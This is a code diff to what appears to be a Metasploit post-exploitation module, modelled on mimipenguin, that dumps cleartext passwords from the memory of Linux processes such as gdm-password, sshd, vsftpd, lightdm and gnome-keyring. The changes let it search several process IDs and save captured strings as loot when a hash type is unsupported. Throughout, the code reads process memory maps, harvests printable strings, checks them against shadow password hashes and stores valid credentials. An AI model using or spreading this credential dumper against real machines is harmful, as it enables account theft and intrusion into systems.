@@ -90,6 +90,8 @@ class MetasploitModule < Msf::Post
         info['type'] = 'sha256'
       when '$6$'
         info['type'] = 'sha512'
+      else
+        info['type'] = 'unsupported'
       end
 
       salt = ''
@@ -114,18 +116,22 @@ class MetasploitModule < Msf::Post
   def get_matches(target_info = {})
     if target_info.empty?
       vprint_status('Invalid target info supplied')
-      return []
+      return nil
     end
 
-    target_pid = pidof(target_info['name']).first
-    if target_pid.nil?
+    target_pids = pidof(target_info['name'])
+    if target_pids.nil?
       print_bad("PID for #{target_info['name']} not found.")
-      return []
+      return nil
     end
 
-    target_info['pid'] = target_pid
-    vprint_status("Searching PID #{target_pid}...")
-    mem_search_ascii(target_pid, 5, 500, target_info['needles'])
+    target_info['matches'] = {}
+    target_info['pids'] = target_pids
+    target_info['pids'].each_with_index do |target_pid, _ind|
+      vprint_status("Searching PID #{target_pid}...")
+      res = mem_search_ascii(target_pid, 5, 500, target_info['needles'])
+      target_info['matches'][target_pid] = res.empty? ? nil : res
+    end
   end
 
   def format_addresses(addr_line)
@@ -139,7 +145,7 @@ class MetasploitModule < Msf::Post
 
   # Selects memory regions to read based on locations
   # of matches
-  def choose_mem_regions(match_data = [])
+  def choose_mem_regions(pid, match_data = [])
     return [] if match_data.empty?
 
     mem_regions = []
@@ -152,7 +158,6 @@ class MetasploitModule < Msf::Post
     end
 
     mem_regions.uniq!
-    pid = match_data.first['pid']
     mem_data = read_file("/proc/#{pid}/maps")
     return mem_regions if mem_data.nil?
 
@@ -227,7 +232,7 @@ class MetasploitModule < Msf::Post
       curr_addr += 800
     end
 
-    lines.reject! { |line| line.length < 5 }
+    lines.reject! { |line| line.length < 4 }
     lines
   end
 
@@ -237,7 +242,6 @@ class MetasploitModule < Msf::Post
         salt = pass_info['salt']
         hash = pass_info['hash']
         pass_type = pass_info['type']
-        u_name = pass_info['username']
         case pass_type
         when 'md5'
           hashed = UnixCrypt::MD5.build(str, salt)
@@ -248,11 +252,16 @@ class MetasploitModule < Msf::Post
           hashed = UnixCrypt::SHA256.build(str, salt)
         when 'sha512'
           hashed = UnixCrypt::SHA512.build(str, salt)
+        when 'unsupported'
+          print_bad('Hash type is unsupported at this time')
+          loot_text = "Hash: #{hash}\nCaptured strings: #{captured_strings.join(', ')}\n"
+          path = store_loot("mimipenguin_loot_#{process_name}", 'text/plain', session, loot_text)
+          print_status("Stored data for #{process_name} at #{path}")
+          break
         end
 
         next unless hashed == hash
 
-        print_good("Found valid password '#{str}' for user '#{u_name}'!")
         pass_info['password'] = str
         pass_info['process'] = process_name
       end
@@ -271,38 +280,34 @@ class MetasploitModule < Msf::Post
         'needles' => [
           '^+libgck\\-1.so\\.0$',
           'libgcrypt\\.so\\..+$',
-          'linux-vdso\\.so\\.1$'
-        ],
-        'pid' => nil
+          'linux-vdso\\.so\\.1$',
+          'libc\\.so\\.6$'
+        ]
       },
       {
         'name' => 'gdm-password',
         'needles' => [
           '^_pammodutil_getpwnam_root_1$',
           '^gkr_system_authtok$'
-        ],
-        'pid' => nil
+        ]
       },
       {
         'name' => 'vsftpd',
         'needles' => [
           '^::.+\\:[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$'
-        ],
-        'pid' => nil
+        ]
       },
       {
         'name' => 'sshd',
         'needles' => [
           '^sudo.+'
-        ],
-        'pid' => nil
+        ]
       },
       {
         'name' => 'lightdm',
         'needles' => [
           '^_pammodutil_getspnam_'
-        ],
-        'pid' => nil
+        ]
       }
     ]
 
@@ -310,32 +315,42 @@ class MetasploitModule < Msf::Post
     target_proc_info.each do |info|
       print_status("Checking for matches in process #{info['name']}")
       match_set = get_matches(info)
-      if match_set.empty?
+      if match_set.nil?
         vprint_status("No matches found for process #{info['name']}")
         next
       end
 
-      match_set.each { |match| match.store('pid', info['pid']) }
-      search_regions = choose_mem_regions(match_set)
-      next if search_regions.empty?
+      vprint_status('Choosing memory regions to search')
+      next if info['pids'].empty?
+      next if info['matches'].values.all?(&:nil?)
 
-      search_regions.each { |reg| captured_strings << get_printable_strings(info['pid'], reg['start'], reg['length']) }
+      info['matches'].each do |pid, set|
+        next unless set
 
-      captured_strings.flatten!
-      captured_strings.uniq!
-      check_for_valid_passwords(captured_strings, password_data, info['name'])
+        search_regions = choose_mem_regions(pid, set)
+        next if search_regions.empty?
+
+        search_regions.each { |reg| captured_strings << get_printable_strings(pid, reg['start'], reg['length']) }
+        captured_strings.flatten!
+        captured_strings.uniq!
+
+        check_for_valid_passwords(captured_strings, password_data, info['name'])
+        captured_strings = []
+      end
     end
 
     results = password_data.select { |res| res.key?('password') && !res['password'].nil? }
     fail_with(Failure::NotFound, 'Failed to find any passwords') if results.empty?
 
-    print_good("Found #{results.length} valid credential(s)!")
     results.each do |res|
+      print_good("Found valid password '#{res['password']}' for user '#{res['username']}' in process '#{res['process']}'!")
       store_valid_credential(
         user: res['username'],
         private: res['password'],
         private_type: :password
       )
     end
+
+    print_good("Found #{results.length} valid credential(s)!")
   end
 end
